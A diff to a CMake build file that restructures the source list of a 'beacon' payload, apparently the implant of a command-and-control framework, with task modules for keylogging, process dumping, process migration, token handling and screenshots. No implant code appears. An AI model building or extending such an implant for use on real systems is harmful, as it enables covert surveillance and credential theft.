@@ -43,20 +43,41 @@ add_compile_definitions(REQUEST_PATH_WEBSOCKET=${REQUEST_PATH_WEBSOCKET})
 if(${PAYLOAD_TYPE} STREQUAL \"beacon\")
     set(SOURCE
             src/main/beacon_${PAYLOAD_FORMAT}.cpp
-            src/core/hermit.cpp
-            src/core/common.cpp
-            src/core/convert.cpp
-            src/core/fs.cpp
-            src/core/ip.cpp
-            src/core/keylog.cpp
-            src/core/net.cpp
-            src/core/registry.cpp
-            src/core/screenshot.cpp
-            src/core/task.cpp
-            src/core/token.cpp
-            src/core/utils.cpp
-            src/core/winhttp.cpp
-            src/core/winsystem.cpp
+            src/hermit.cpp
+            src/core/handler.cpp
+            src/core/stdout.cpp
+            src/core/system/arch.cpp
+            src/core/system/env.cpp
+            src/core/system/fs.cpp
+            src/core/system/http.cpp
+            src/core/system/priv.cpp
+            src/core/system/process.cpp
+            src/core/tasks/cat.cpp
+            src/core/tasks/cd.cpp
+            src/core/tasks/cp.cpp
+            src/core/tasks/download.cpp
+            src/core/tasks/execute.cpp
+            src/core/tasks/ip.cpp
+            src/core/tasks/keylog.cpp
+            src/core/tasks/kill.cpp
+            src/core/tasks/ls.cpp
+            src/core/tasks/migrate.cpp
+            src/core/tasks/mkdir.cpp
+            src/core/tasks/mv.cpp
+            src/core/tasks/net.cpp
+            src/core/tasks/procdump.cpp
+            src/core/tasks/ps.cpp
+            src/core/tasks/pwd.cpp
+            src/core/tasks/reg.cpp
+            src/core/tasks/rm.cpp
+            src/core/tasks/rmdir.cpp
+            src/core/tasks/screenshot.cpp
+            src/core/tasks/sleep.cpp
+            src/core/tasks/token.cpp
+            src/core/tasks/upload.cpp
+            src/core/tasks/whoami.cpp
+            src/core/utils/convert.cpp
+            src/core/utils/split.cpp
     )
 # elseif(${PAYLOAD_TYPE} STREQUAL \"interactive\")
 endif()
